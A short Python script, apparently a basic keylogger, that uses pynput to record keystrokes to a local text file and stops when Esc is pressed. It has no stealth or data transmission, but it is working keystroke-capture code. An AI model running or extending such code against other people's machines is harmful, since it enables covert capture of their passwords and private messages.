from pynput.keyboard import Key, Listener

# File to log the keystrokes
log_file = "key_log.txt"

# Function to write the keys pressed to the log file
def write_to_file(key):
    key_data = str(key).replace("'", "")  # Clean key data
    if key_data == "Key.space":
        key_data = " "  # Replace 'space' key with a space character
    elif key_data == "Key.enter":
        key_data = "\n"  # Replace 'enter' key with a newline
    elif key_data.startswith("Key"):
        key_data = ""  # Ignore other special keys like 'shift', 'ctrl', etc.

    with open(log_file, "a") as f:
        f.write(key_data)

# Function to run when a key is pressed
def on_press(key):
    write_to_file(key)

# Function to run when a key is released (optional, can stop logging on release of 'esc')
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the key listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
